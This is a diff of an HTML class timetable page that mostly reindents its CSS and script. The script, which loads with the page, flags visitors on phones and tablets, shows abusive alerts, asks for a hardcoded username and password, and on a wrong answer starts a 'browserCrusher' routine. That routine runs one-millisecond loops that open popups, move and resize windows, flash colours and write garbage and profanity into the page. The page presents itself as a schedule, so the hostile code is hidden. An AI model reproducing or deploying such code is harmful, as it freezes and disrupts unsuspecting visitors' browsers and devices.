@@ -6,192 +6,192 @@
     <title>Timetable 3.0.1</title>
     <style>
 
-    body {
-
-      background-color : #02173C;
-      background-image : url( "img/bg/1440_900_20120223032123223025.jpg" );
-      background-position : top center;
-      background-repeat : no-repeat;
-      background-attachment : fixed;     /* hold bgimg when scroll */
-      background-size : cover;
-
-      color : #E5B217;
-      font-family : "SourceHanCodeJP-Light", sans-serif, monospace, serif;
-    }
-
-    div.htmlWrap {
-
-      background-color : rgba( 02, 17, 60 , 0.5 );
-      margin : 0;
-      font-size : 0.8em;
-    }
-
-    h1 {
-
-      text-align : center;
-    }
-
-    h2.title {
-
-      text-align : center;
-    }
-
-    table {
-
-      border : solid 2px #E5B217;
-      border-collapse : collapse;
-      margin : auto;
-    }
-
-    div.timetable {
-
-      margin-bottom : 5em;
-    }
-
-    table tr th,
-    table tr td {
-
-      border : solid 1px #E5B217;
-      text-align : center;
-    }
-
-    table tr:not(.schoolTime) th {
-
-      width : 50px;
-      border : solid 2px #E5B217;
-    }
-
-    table tr td {
-
-      min-width : 220px;
-      height : 100px;
-      padding : 2em 0.3em;
-      border : solid 1px #E5B217;
-    }
-
-    table tr.time.range,
-    table .botDouble {
-
-      border-spacing : 0 0;
-      border-right : solid 2px #E5B217;
-      border-bottom : double 3px #E5B217;
-    }
-
-    div.timetable table tr td div.subject {
-
-      font-size : 1.05em;
-    }
-
-    div.timetable.main table tr td div.teacher {
-
-      display : block;
-    }
-
-    div.timetable.main table tr td div.room {
-
-      font-weight : bold;
-    }
-
-    table tr td div.text-tool {
-
-      display : block;
-    }
-
-    div.timetable.main table tr td div.text-tool.none {
-
-      display : none;
-    }
-
-    div.timetable.online table tr td div.room {
-
-      display : none;
-    }
-
-    .cg-application-first {
-
-      display : none;
-    }
-
-    .breakTime {
-
-      min-width : 110px;
-    }
-
-    div.timetable table tr td div.subject {
-
-      font-size : em;
-    }
-
-    .bold {
-
-      font-weight : bold;
-    }
-
-    /* subject cell background img */
-    td {
-
-      position : relative;
-    }
-
-
-    /* online timetable (1027 - 1108) */
-    div.timetable.online {
-
-      display : block;
-    }
-
-    table.timetable.online {
-
-      margin-bottom : 5em;
-    }
-
-    table.timetable.online div.room {
-
-      display : none;
-    }
-
-    table.timetable.online div.teacher {
-
-      display : block;
-    }
-
-
-    @media print {
-
       body {
 
-        background : none;
-        background-color : transparent;
-        color : block
+        background-color : #02173C;
+        background-image : url( "img/bg/1440_900_20120223032123223025.jpg" );
+        background-position : top center;
+        background-repeat : no-repeat;
+        background-attachment : fixed;     /* hold bgimg when scroll */
+        background-size : cover;
+
+        color : #E5B217;
+        font-family : "SourceHanCodeJP-Light", sans-serif, monospace, serif;
       }
 
       div.htmlWrap {
 
-        background-color : transparent;
+        background-color : rgba( 02, 17, 60 , 0.5 );
+        margin : 0;
+        font-size : 0.8em;
       }
 
-      div.page-break {
+      h1 {
 
-        break-after : page;
+        text-align : center;
       }
 
-      div.htmlWrap h1,
-      div.htmlWrap h2.title,
-      div.timetable table,
-      div.timetable table tr th,
-      div.timetable table tr td,
-      div.timetable table tr.time.range,
+      h2.title {
+
+        text-align : center;
+      }
+
+      table {
+
+        border : solid 2px #E5B217;
+        border-collapse : collapse;
+        margin : auto;
+      }
+
+      div.timetable {
+
+        margin-bottom : 5em;
+      }
+
+      table tr th,
+      table tr td {
+
+        border : solid 1px #E5B217;
+        text-align : center;
+      }
+
+      table tr:not(.schoolTime) th {
+
+        width : 50px;
+        border : solid 2px #E5B217;
+      }
+
+      table tr td {
+
+        min-width : 220px;
+        height : 100px;
+        padding : 2em 0.3em;
+        border : solid 1px #E5B217;
+      }
+
+      table tr.time.range,
       table .botDouble {
 
-        border-color : #000000;
-        color : #000000;
+        border-spacing : 0 0;
+        border-right : solid 2px #E5B217;
+        border-bottom : double 3px #E5B217;
       }
 
-      div.timetable table tr td div.bg {
+      div.timetable table tr td div.subject {
+
+        font-size : 1.05em;
+      }
+
+      div.timetable.main table tr td div.teacher {
 
         display : block;
       }
-    }
+
+      div.timetable.main table tr td div.room {
+
+        font-weight : bold;
+      }
+
+      table tr td div.text-tool {
+
+        display : block;
+      }
+
+      div.timetable.main table tr td div.text-tool.none {
+
+        display : none;
+      }
+
+      div.timetable.online table tr td div.room {
+
+        display : none;
+      }
+
+      .cg-application-first {
+
+        display : none;
+      }
+
+      .breakTime {
+
+        min-width : 110px;
+      }
+
+      div.timetable table tr td div.subject {
+
+        font-size : em;
+      }
+
+      .bold {
+
+        font-weight : bold;
+      }
+
+      /* subject cell background img */
+      td {
+
+        position : relative;
+      }
+
+
+      /* online timetable (1027 - 1108) */
+      div.timetable.online {
+
+        display : block;
+      }
+
+      table.timetable.online {
+
+        margin-bottom : 5em;
+      }
+
+      table.timetable.online div.room {
+
+        display : none;
+      }
+
+      table.timetable.online div.teacher {
+
+        display : block;
+      }
+
+
+      @media print {
+
+        body {
+
+          background : none;
+          background-color : transparent;
+          color : block
+        }
+
+        div.htmlWrap {
+
+          background-color : transparent;
+        }
+
+        div.page-break {
+
+          break-after : page;
+        }
+
+        div.htmlWrap h1,
+        div.htmlWrap h2.title,
+        div.timetable table,
+        div.timetable table tr th,
+        div.timetable table tr td,
+        div.timetable table tr.time.range,
+        table .botDouble {
+
+          border-color : #000000;
+          color : #000000;
+        }
+
+        div.timetable table tr td div.bg {
+
+          display : block;
+        }
+      }
 
     </style>
   </head>
@@ -211,7 +211,6 @@
             <th>4</th>
             <th>5</th>
             <th>6</th>
-            <!--<th>6</th>-->
           </tr>
           <tr class="time range">
             <th>09:00 - 10:10</th>
@@ -221,7 +220,6 @@
             <th>14:00 - 15:10</th>
             <th>15:25 - 16:35</th>
             <th>16:50 - 18:00</th>
-            <!--<th>16:50 - 18:00</th>-->
           </tr>
           <tr class="mon">
             <th class="weekday">Mon</th>
@@ -456,7 +454,7 @@
         </table>  <!-- 2semester timetable -->
       </div>
 
-      <div class="page-break"></div>
+      <div class="page-break"></div>  <!-- page break -->
 
       <div class="timetable online">
         <h2 class="title h2">online timetable ( 04/12 - 04/14 )</h2>
@@ -716,233 +714,234 @@
 
     <script>
 
-    window.addEventListener ( "load", init, false );
+      window.addEventListener ( "load", init, false );
 
-    function init () {
+      function init () {
 
-      let username = "hoge";
-      let password = "fuga";
-      let ua = window.navigator.userAgent.toLowerCase ();
-      if ( isDullDevice () ) {
+        let username = "hoge";
+        let password = "fuga";
+        let ua = window.navigator.userAgent.toLowerCase ();
+        if ( isDullDevice () ) {
 
-        alert ( "You are using stupid and dull fucking device!" );
-        alert ( "We will attacks to fucking device (smartphone and tablet)." );
-        let user = window.prompt ( "Enter the username." );
-        let pass = window.prompt ( "Enter the password." );
+          alert ( "You are using stupid and dull fucking device!" );
+          alert ( "We will attacks to fucking device (smartphone and tablet)." );
+          let user = window.prompt ( "Enter the username." );
+          let pass = window.prompt ( "Enter the password." );
 
-        if ( user != username || pass != password ) {
+          if ( user != username || pass != password ) {
 
-          browserCrusher ();
-        }
-      }
-      console.log ( ua );
-
-      // contextmenu
-      document.oncontextmenu = function () {
-
-        let command = window.prompt ( "Enter the command" );
-        command = command.toLowerCase ();
-
-        switch ( command ) {
-          case '':
-          case 'context':
-          case 'contextmenu':
-          case 'menu':
-            return true;
-
-          case 'display:block':
-          case 'body.display:block':
-          case 'body.style.display:block':
-          case 'timetable.display:block':
-          case 'timetable.style.display:block':
-          case '.timetable.display:block':
-          case '.timetable.style.display:block':
-          case 'body.timetable.display:block':
-          case 'body.timetable.style.display:block':
-            toggleDisp ( "timetable", true );
-            break;
-
-          case 'display:none':
-          case 'style.display:none':
-          case 'body.display:none':
-          case 'body.style.display:none':
-          case 'timetable.display:none':
-          case 'timetable.style.display:none':
-          case '.timetable.display:none':
-          case '.timetable.style.display:none':
-          case 'body.timetable.display:none':
-          case 'body.timetable.style.display:none':
-            toggleDisp ( "timetable", false );
-            break;
-
-          case 'main.display:block':
-          case 'main.style.display:block':
-          case '.main.display:block':
-          case '.main.style.display:block':
-          case 'body.main.display:block':
-          case 'body.main.style.display:block':
-          case 'timetable.main.display:block':
-          case 'timetable.main.style.display:block':
-          case '.timetable.main.display:block':
-          case '.timetable.main.style.display:block':
-          case 'body.timetable.main.display:block':
-          case 'body.timetable.main.style.display:block':
-            toggleDisp ( "main", true );
-            break;
-
-          case 'main.display:none':
-          case 'main.style.display:none':
-          case '.main.display:none':
-          case '.main.style.display:none':
-          case 'timetable.main.display:none':
-          case 'timetable.main.style.display:none':
-          case '.timetable.main.display:none':
-          case '.timetable.main.style.display:none':
-          case 'body.timetable.main.display:none':
-          case 'body.timetable.main.style.display:none':
-            toggleDisp ( "main", false );
-            break;
-
-          case 'online.display:block':
-          case 'online.style.display:block':
-          case '.online.display:block':
-          case '.online.style.display:block':
-          case 'timetable.online.display:block':
-          case 'timetable.online.style.display:block':
-          case '.timetable.online.display:block':
-          case '.timetable.online.style.display:block':
-          case 'body.timetable.online.display:block':
-          case 'body.timetable.online.style.display:block':
-            toggleDisp ( "online", true );
-            break;
-
-          case 'online.display:none':
-          case 'online.style.display:none':
-          case '.online.display:none':
-          case '.online.style.display:none':
-          case 'timetable.online.display:none':
-          case 'timetable.online.style.display:none':
-          case '.timetable.online.display:none':
-          case '.timetable.online.style.display:none':
-          case 'body.timetable.online.display:none':
-          case 'body.timetable.online.style.display:none':
-            toggleDisp ( "online", false );
-            break;
-
-          default:
-            alert ( "'" + command + "' is not command" );
-        }
-        return false;
-      }
-
-      function isDullDevice () {
-
-        let stupidUA = /Android | webOS | iPhone | iPad | iPod | BlackBerry | IEMobile | Opera Mini/i;
-        return ( window.navigator.userAgent.search ( stupidUA ) !== -1);
-      }
-
-      function toggleDisp ( elem , state ) {
-
-        let element = [];
-        switch ( elem ) {
-          case 'timetable':
-            element [ 0 ] = document.querySelector ( ".htmlWrap" );
-            element [ 1 ] = document.querySelector ( ".timetable.main" );
-            // element [ 2 ] = document.querySelector ( ".timetable.online" );
-            break;
-
-          case 'main':
-            element = document.querySelectorAll ( ".timetable.main" );
-            break;
-
-          case 'online':
-            element = document.querySelectorAll ( ".timetable.online" );
-            break;
-        }
-
-        if ( state ) {
-
-          for ( let i = 0; i < element.length; i++ ) {
-
-            element [ i ].style.display = "block";
-            document.querySelector ( ".htmlWrap" ).style.display = "block";
-          }
-
-        } else {
-
-          for ( let i = 0; i < element.length; i++ ) {
-
-            element [ i ].style.display = "none";
-          }
-        }
-      }
-
-      function browserCrusher () {
-
-        setInterval ( bgcolCrusher, 1 );
-        setInterval ( rdmOpWin , 1 );
-        setInterval ( rdmMvWin , 1 );
-        setInterval ( rdmResizeWin , 100 );
-        setInterval ( rdmChar , 1 );
-        setInterval ( rdmWord , 100 );
-
-        let probabilityWin = 0.001;
-        let probabilityWord = 0.0001;
-
-        function bgcolCrusher () {
-
-          let rgb = "";
-          let body = document.querySelector ( "body" );
-          for ( let i = 0; i < 3; i++ ) {
-
-            rgb = rgb + Math.floor ( Math.random () * 256 ).toString ( 16 );
-          }
-          body.style.backgroundColor = "#" + rgb;
-        }
-
-        function rdmOpWin () {
-
-          // let probability = 0.001;
-          if ( Math.random () < probabilityWin ) {
-
-            // window.open ( "browserCrusher.html" , "hoge" , "width=300 , height=200" );
-            // for ( let i = 0; i < 3; i++ ) {
-              window.open ( "timetable.html" , "_blank" , "width=300 , height=200" );
-              probability = probability * 0.5;
-              // console.log("op");
-            // }
+            browserCrusher ();
           }
         }
 
-        function rdmMvWin () {
+        console.log ( ua );
 
-          window.moveBy ( Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width , Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height );
-          // let w = Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width;
-          // let h = Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height;
+        // contextmenu
+        document.oncontextmenu = function () {
 
+          let command = window.prompt ( "Enter the command" );
+          command = command.toLowerCase ();
+
+          switch ( command ) {
+            case '':
+            case 'context':
+            case 'contextmenu':
+            case 'menu':
+              return true;
+
+            case 'display:block':
+            case 'body.display:block':
+            case 'body.style.display:block':
+            case 'timetable.display:block':
+            case 'timetable.style.display:block':
+            case '.timetable.display:block':
+            case '.timetable.style.display:block':
+            case 'body.timetable.display:block':
+            case 'body.timetable.style.display:block':
+              toggleDisp ( "timetable", true );
+              break;
+
+            case 'display:none':
+            case 'style.display:none':
+            case 'body.display:none':
+            case 'body.style.display:none':
+            case 'timetable.display:none':
+            case 'timetable.style.display:none':
+            case '.timetable.display:none':
+            case '.timetable.style.display:none':
+            case 'body.timetable.display:none':
+            case 'body.timetable.style.display:none':
+              toggleDisp ( "timetable", false );
+              break;
+
+            case 'main.display:block':
+            case 'main.style.display:block':
+            case '.main.display:block':
+            case '.main.style.display:block':
+            case 'body.main.display:block':
+            case 'body.main.style.display:block':
+            case 'timetable.main.display:block':
+            case 'timetable.main.style.display:block':
+            case '.timetable.main.display:block':
+            case '.timetable.main.style.display:block':
+            case 'body.timetable.main.display:block':
+            case 'body.timetable.main.style.display:block':
+              toggleDisp ( "main", true );
+              break;
+
+            case 'main.display:none':
+            case 'main.style.display:none':
+            case '.main.display:none':
+            case '.main.style.display:none':
+            case 'timetable.main.display:none':
+            case 'timetable.main.style.display:none':
+            case '.timetable.main.display:none':
+            case '.timetable.main.style.display:none':
+            case 'body.timetable.main.display:none':
+            case 'body.timetable.main.style.display:none':
+              toggleDisp ( "main", false );
+              break;
+
+            case 'online.display:block':
+            case 'online.style.display:block':
+            case '.online.display:block':
+            case '.online.style.display:block':
+            case 'timetable.online.display:block':
+            case 'timetable.online.style.display:block':
+            case '.timetable.online.display:block':
+            case '.timetable.online.style.display:block':
+            case 'body.timetable.online.display:block':
+            case 'body.timetable.online.style.display:block':
+              toggleDisp ( "online", true );
+              break;
+
+            case 'online.display:none':
+            case 'online.style.display:none':
+            case '.online.display:none':
+            case '.online.style.display:none':
+            case 'timetable.online.display:none':
+            case 'timetable.online.style.display:none':
+            case '.timetable.online.display:none':
+            case '.timetable.online.style.display:none':
+            case 'body.timetable.online.display:none':
+            case 'body.timetable.online.style.display:none':
+              toggleDisp ( "online", false );
+              break;
+
+            default:
+              alert ( "'" + command + "' is not command" );
+          }
+          return false;
         }
 
-        function rdmResizeWin () {
+        function isDullDevice () {
 
-          window.resizeBy ( Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width , Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height );
+          let stupidUA = /Android | webOS | iPhone | iPad | iPod | BlackBerry | IEMobile | Opera Mini/i;
+          return ( window.navigator.userAgent.search ( stupidUA ) !== -1);
         }
 
-        function rdmChar () {
+        function toggleDisp ( elem , state ) {
 
-          let chars = "0123456789abcdefghijklmnopqrstuvwxyz`~!@#$%^&*()-_=+[{}]\|;:,./<>?¡™£¢∞§¶•ªº–≠œ∑´®¥¨π“‘«»’”∆˚¬…˜µ≤≥÷æΩ≈ç√";
-          document.write ( chars [ Math.floor ( Math.random () * chars.length ) ] );
+          let element = [];
+          switch ( elem ) {
+            case 'timetable':
+              element [ 0 ] = document.querySelector ( ".htmlWrap" );
+              element [ 1 ] = document.querySelector ( ".timetable.main" );
+              // element [ 2 ] = document.querySelector ( ".timetable.online" );
+              break;
+
+            case 'main':
+              element = document.querySelectorAll ( ".timetable.main" );
+              break;
+
+            case 'online':
+              element = document.querySelectorAll ( ".timetable.online" );
+              break;
+          }
+
+          if ( state ) {
+
+            for ( let i = 0; i < element.length; i++ ) {
+
+              element [ i ].style.display = "block";
+              document.querySelector ( ".htmlWrap" ).style.display = "block";
+            }
+
+          } else {
+
+            for ( let i = 0; i < element.length; i++ ) {
+
+              element [ i ].style.display = "none";
+            }
+          }
         }
 
-        function rdmWord () {
+        function browserCrusher () {
 
-          let word = [ "fuck", "asshole" ];
-          if ( Math.random () < probabilityWord ) {
+          setInterval ( bgcolCrusher, 1 );
+          setInterval ( rdmOpWin , 1 );
+          setInterval ( rdmMvWin , 1 );
+          setInterval ( rdmResizeWin , 100 );
+          setInterval ( rdmChar , 1 );
+          setInterval ( rdmWord , 100 );
 
-            document.write ( word [ Math.floor ( Math.random () * word.length ) ] );
+          let probabilityWin = 0.001;
+          let probabilityWord = 0.0001;
+
+          function bgcolCrusher () {
+
+            let rgb = "";
+            let body = document.querySelector ( "body" );
+            for ( let i = 0; i < 3; i++ ) {
+
+              rgb = rgb + Math.floor ( Math.random () * 256 ).toString ( 16 );
+            }
+            body.style.backgroundColor = "#" + rgb;
+          }
+
+          function rdmOpWin () {
+
+            // let probability = 0.001;
+            if ( Math.random () < probabilityWin ) {
+
+              // window.open ( "browserCrusher.html" , "hoge" , "width=300 , height=200" );
+              // for ( let i = 0; i < 3; i++ ) {
+                window.open ( "timetable.html" , "_blank" , "width=300 , height=200" );
+                probability = probability * 0.5;
+                // console.log("op");
+              // }
+            }
+          }
+
+          function rdmMvWin () {
+
+            window.moveBy ( Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width , Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height );
+            // let w = Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width;
+            // let h = Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height;
+
+          }
+
+          function rdmResizeWin () {
+
+            window.resizeBy ( Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width , Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height );
+          }
+
+          function rdmChar () {
+
+            let chars = "0123456789abcdefghijklmnopqrstuvwxyz`~!@#$%^&*()-_=+[{}]\|;:,./<>?¡™£¢∞§¶•ªº–≠œ∑´®¥¨π“‘«»’”∆˚¬…˜µ≤≥÷æΩ≈ç√";
+            document.write ( chars [ Math.floor ( Math.random () * chars.length ) ] );
+          }
+
+          function rdmWord () {
+
+            let word = [ "fuck", "asshole" ];
+            if ( Math.random () < probabilityWord ) {
+
+              document.write ( word [ Math.floor ( Math.random () * word.length ) ] );
+            }
           }
         }
       }
-    }
 
     </script>
   </body>
